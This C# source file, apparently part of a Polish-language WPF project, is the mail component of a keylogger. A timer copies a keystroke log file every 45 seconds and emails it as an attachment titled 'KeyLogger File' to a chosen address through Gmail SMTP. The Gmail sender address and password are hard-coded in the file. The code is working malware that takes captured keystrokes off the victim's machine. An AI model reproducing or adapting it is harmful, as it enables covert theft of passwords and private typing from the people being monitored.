using System;
using System.Timers;
using System.Net.Mail;
using System.Net;
using System.Net.Mime;
using System.Collections.Generic;
using System.Windows;

namespace WpfApplication8
{
    class MailHandler
    {
        string mailTo;
        string filename = "rtx32.txt", targetname = "rtx86.txt";
        private static System.Timers.Timer Timer;
        List<string> mails = new List<string>();

        private void SetTimer(System.Timers.Timer aTimer, string mailbox)
        {
            mailTo = mailbox;
            aTimer = new System.Timers.Timer(45000);
            Timer = aTimer;
            Timer.Elapsed += (sender, e) => SendMail(sender, e, mailTo);
            Timer.AutoReset = true;
            Timer.Enabled = true;
        }

        private void SendMail(Object source, ElapsedEventArgs e, string mailTo)
        {
            CopyFile copyfile = new CopyFile();
            copyfile.CopyTxtFile(filename, targetname);
            string host = "smtp.gmail.com";
            SmtpClient client = new SmtpClient(host, 587);
            client.Credentials = new NetworkCredential("21edqcds@gmail.com", "P@ssw0rd_");
            client.EnableSsl = true;
            MailAddress from = new MailAddress("21edqcds@gmail.com");
            MailAddress to;
            try
            {
                to = new MailAddress(mailTo);
                MailMessage message = new MailMessage(from, to);
                message.Body = "Zawartość pliku txt w załączniku";
                Attachment data = new Attachment(targetname, MediaTypeNames.Application.Octet);
                ContentDisposition disposition = data.ContentDisposition;
                disposition.CreationDate = System.IO.File.GetCreationTime(targetname);
                disposition.ModificationDate = System.IO.File.GetLastWriteTime(targetname);
                disposition.ReadDate = System.IO.File.GetLastAccessTime(targetname);
                message.Attachments.Add(data);
                message.Subject = "KeyLogger File";
                client.Send(message);
            }
            catch (ArgumentException ex)
            {
                Console.WriteLine("Pusty adres e-mail ");
            }
            client.Dispose();
            //Console.WriteLine(" Message sent ");
            //Console.ReadLine();
        }

        public void MailStop()
        {
            //aTimer.Stop();
            try
            {
                Timer.Enabled = false;
            }
            catch(NullReferenceException ex)
            {

            }
        }

        public void CheckMails(System.Timers.Timer aTimer, string mailbox)
        {
            if(mails.Contains(mailbox))
            {
                MessageBox.Show("Na ten e-mail są wysyłane już wiadomości");
            }
            else
            {
                mails.Add(mailbox);
                SetTimer(aTimer, mailbox);
            }
        }
    }
}
